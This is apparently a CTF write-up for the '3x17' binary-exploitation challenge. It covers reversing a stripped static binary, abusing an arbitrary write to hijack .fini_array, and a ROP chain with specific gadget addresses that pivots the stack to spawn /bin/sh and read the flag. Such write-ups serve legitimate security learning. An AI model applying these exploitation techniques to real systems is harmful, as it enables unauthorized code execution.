# 3x17 Writeup

This challenge was relatively difficult for me and introduced a few new concepts to me. Overall a pretty good challenge I would say.

I started out by looking at the binary information to see what's going on. Calling `pwn checksec ./3x17` shows this:

```
 Arch:     amd64-64-little
 RELRO:    Partial RELRO
 Stack:    No canary found
 NX:       NX enabled
 PIE:      No PIE (0x400000)
```

Nice! No PIE and no canary. That makes it easier. Wait a second...`file ./3x17`

```
./3x17: ELF 64-bit LSB executable,
x86-64, version 1 (GNU/Linux),
statically linked,
for GNU/Linux 3.2.0,
BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3,
stripped
```

We're working with a stripped binary. This is gonna make it a little tough to work with. I decided to look through ghidra to figure out what was going on a little better. Taking a look at `entry` I can see that there is a function that looks a lot like `__libc_start_main` being called:

```
FUN_00401eb0(main,in_stack_00000000,&stack0x00000008,FUN_004028d0,FUN_00402960,param_3,auStack8)
```

The main there was added after the fact. I know that in a call to `__libc_start_main` the first argument is always a pointer to the main function. So I decided to take a look at that function to see what it did. The next example shows the function with all the function names that I filled out as I was testing the program. But essentially the main function looked like this:

```
int main(){
  DAT_004b9330 = DAT_004b9330 + '\x01';
  cVar1 = DAT_004b9330;
  if (DAT_004b9330 == '\x01') {
    write(1,"addr:",5);
    read(0,local_28,0x18);
    addr = atoi(local_28);
    write(1,"data:",5);
    read(0,(long)addr,0x18);
    cVar1 = '\0';
  }
  }
```

This entire function is very useful to know. Essentially what it's doing is reading a value that the user is able to enter then converting that value to a number. Then it will use that value as the destination of the next user input. Essentially an arbitrary write to any writeable memory. Looking at the section headers we can see what's writeable.

```
Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .note.ABI-tag     NOTE             0000000000400200  00000200
       0000000000000020  0000000000000000   A       0     0     4
  [ 2] .note.gnu.build-i NOTE             0000000000400220  00000220
       0000000000000024  0000000000000000   A       0     0     4
  [ 3] .rela.plt         RELA             0000000000400248  00000248
       0000000000000228  0000000000000018  AI       0    19     8
  [ 4] .init             PROGBITS         0000000000401000  00001000
       0000000000000017  0000000000000000  AX       0     0     4
  [ 5] .plt              PROGBITS         0000000000401018  00001018
       00000000000000b8  0000000000000000  AX       0     0     8
  [ 6] .text             PROGBITS         00000000004010d0  000010d0
       000000000008b360  0000000000000000  AX       0     0     16
  [ 7] __libc_freeres_fn PROGBITS         000000000048c430  0008c430
       0000000000001efa  0000000000000000  AX       0     0     16
  [ 8] .fini             PROGBITS         000000000048e32c  0008e32c
       0000000000000009  0000000000000000  AX       0     0     4
  [ 9] .rodata           PROGBITS         000000000048f000  0008f000
       000000000001937c  0000000000000000   A       0     0     32
  [10] .stapsdt.base     PROGBITS         00000000004a837c  000a837c
       0000000000000001  0000000000000000   A       0     0     1
  [11] .eh_frame         PROGBITS         00000000004a8380  000a8380
       000000000000a608  0000000000000000   A       0     0     8
  [12] .gcc_except_table PROGBITS         00000000004b2988  000b2988
       00000000000000a9  0000000000000000   A       0     0     1
  [13] .tdata            PROGBITS         00000000004b40c0  000b30c0
       0000000000000020  0000000000000000 WAT       0     0     8
  [14] .tbss             NOBITS           00000000004b40e0  000b30e0
       0000000000000040  0000000000000000 WAT       0     0     8
  [15] .init_array       INIT_ARRAY       00000000004b40e0  000b30e0
       0000000000000010  0000000000000008  WA       0     0     8
  [16] .fini_array       FINI_ARRAY       00000000004b40f0  000b30f0
       0000000000000010  0000000000000008  WA       0     0     8
  [17] .data.rel.ro      PROGBITS         00000000004b4100  000b3100
       0000000000002df4  0000000000000000  WA       0     0     32
  [18] .got              PROGBITS         00000000004b6ef8  000b5ef8
       00000000000000f0  0000000000000000  WA       0     0     8
  [19] .got.plt          PROGBITS         00000000004b7000  000b6000
       00000000000000d0  0000000000000008  WA       0     0     8
  [20] .data             PROGBITS         00000000004b70e0  000b60e0
       0000000000001af0  0000000000000000  WA       0     0     32
  [21] __libc_subfreeres PROGBITS         00000000004b8bd0  000b7bd0
       0000000000000048  0000000000000000  WA       0     0     8
  [22] __libc_IO_vtables PROGBITS         00000000004b8c20  000b7c20
       00000000000006a8  0000000000000000  WA       0     0     32
  [23] __libc_atexit     PROGBITS         00000000004b92c8  000b82c8
       0000000000000008  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           00000000004b92e0  000b82d0
       0000000000001718  0000000000000000  WA       0     0     32
  [25] __libc_freeres_pt NOBITS           00000000004ba9f8  000b82d0
       0000000000000028  0000000000000000  WA       0     0     8
  [26] .comment          PROGBITS         0000000000000000  000b82d0
       0000000000000023  0000000000000001  MS       0     0     1
  [27] .note.stapsdt     NOTE             0000000000000000  000b82f4
       00000000000010c0  0000000000000000           0     0     4
  [28] .shstrtab         STRTAB           0000000000000000  000b93b4
       0000000000000134  0000000000000000           0     0     1
```

Looks like anything past the `.tdata` array is writeable. I thought about using the GOT, but the program doesn't call any other functions after getting the user input. Originally I was under the impression that the program stops immediately after the main function. What I learned is that libc has something called the `.init_array` and `.fini_array`. These are the arrays that hold the constuctors and destructors of the program. Since the constuctors have already been called so I can't do anything there. The destructors are called at the end of the program though so I know those haven't been called yet at the time of user input. I can see that that location is writable, I just need to know how `.fini_array` works. Looking at [This](https://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html) I can see that the `.fini_array` holds the pointers to two desctructor functions. I can see where they get called by looking at the functions in ghidra. The when I do that, I can check out the calling function from the calling tree. This is what that function looks like:

```c
void FUN_00402960(void)

{
  long lVar1;

  lVar1 = 1;
  do {
    (*(code *)(&PTR_FUN_004b40f0)[lVar1])();
    lVar1 = lVar1 + -1;
  } while (lVar1 != -1);
  return;
}
```

Essentially what this is doing is taking the array at `PTR_FUN_004b40f0` and calling the pointer at `index 1`. Once the program comes back to this spot, the fucntion at `index 0` gets called which is the function that actually exits the program. If we are going to exploit this we can replace that `index 1` pointer with the address of main. With this, the `.fini_array` will go from this:

```
<fini_array_addr> : <second_called_ptr> <first_called_ptr>
```
to this:
```
<fini_array_addr> : <second_called_ptr> <main_func>
```

So there's one problem with this. If we recall our main function, there's a value that increases every time it gets called. If we call main again, the value gets incremented again and we don't get another read. Luckily this value is a byte type. This will be useful in the future. When the main function returns from it's failure to read again, it will come back to the `FUN_00402960` function except now it will call the function at `index 0`. All I had to do was replace that other function pointer with the beginning of the `FUN_00402960` function. Which would reset the counter and call the main function again. So it looks like this instead:
```
<fini_array_addr> : <FUN_00402960> <main_func>
```
This allows for an infinite loop of the main function. This is useless to us for now since that incremented byte variable prevents us from being able to write more, but luckily it's a byte. After 256 loops, it will roll over back to 0 again and we can write some more to some location in memory. This is where we can start to build a ROP chain. I got some ROP gadgets that will just get the registers prepped for an execve syscall:

```
pop RAX; RET = 0x41e4af
> 0x3b
pop RDI; RET = 0x48c429
> '/bin/sh\x00'
pop RSI; RET = 0x48a79a
> 0x0
pop RDX; RET = 0x44a2e6
> 0x0
syscall = 0x486e0f
```
Now I need to find where to put it and we're set. This is hard though because we dont really have control of the stack. This is where I learned about stack pivots. If you call `leave; ret` at certain places in the program, it will pivot the stack to an address on the stack which is really useful in the case of this challenge. If we try to put this in the second fini_array address, then we have a problem. It doesn't have a nice address on the stack, so it will just break the program execution. If we instead put in in the first index in the array, the stack has a nice address on it: `0x4b4100`. Now all we have to do is write the rop chain to this spot and then replace the mentioned location with  `leave; ret`. Now we have our finished exploit and it will stack pivot in order to put our saved ROP chain on the stack and run it! There we go:
```
[*] Switching to interactive mode
$ cd /home/3x17
$ ls
3x17
run.sh
the_4ns_is_51_fl4g
$ cat the_4ns_is_51_fl4g
flag{<flag_here>}
```
